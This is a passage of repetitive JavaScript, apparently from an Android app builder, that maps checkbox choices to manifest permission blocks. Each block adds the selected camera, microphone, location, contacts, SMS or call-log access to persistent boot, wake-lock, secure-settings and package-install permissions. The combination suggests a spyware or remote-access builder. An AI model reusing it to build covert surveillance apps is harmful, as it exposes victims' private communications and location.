            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }

          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>         `
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         `
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>         `
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>         ` 
        }
          if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>            ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>  `
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>         ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>         ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>         `
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>         ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         ` 
        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            ` 
        }


          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            ` 
        }

          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         
            ` 
        }
          if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false){
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
